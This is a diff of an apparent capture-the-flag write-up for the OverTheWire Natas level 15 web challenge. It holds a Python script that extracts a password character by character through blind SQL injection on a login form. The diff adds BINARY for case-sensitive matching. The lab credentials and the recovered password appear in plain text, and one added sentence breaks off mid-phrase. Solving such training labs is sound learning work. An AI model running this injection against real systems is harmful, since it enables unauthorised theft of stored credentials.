@@ -13,7 +13,7 @@ import string
 const = ""
 for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
   for entry in string.ascii_letters + string.digits:
-      payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR password = "{0}") AND  ""="'.format(const + entry)}
+      payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR  BINARY password = "{0}") AND  ""="'.format(const + entry)}
       response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
       # print(entry)
       if "This user exists." in response.text:
@@ -23,6 +23,6 @@ for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
 print(const)
 ```
 
-Knowing that the password is always the same length, and that it's either a alphebetical character or digit, we basically just checked each position so see what character they are. So the whole code evaluates to a big fat O(62n). But hey, it works.
+Knowing that the password is always the same length, and that it's either a alphebetical character or digit, we basically just checked each position so see what character they are. So the whole code evaluates to a big fat O(62n). But hey, it works. (Oh yeah also SQL columns are case insensitive, so you need to put BINARY in front of the column you're)
 
 > WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
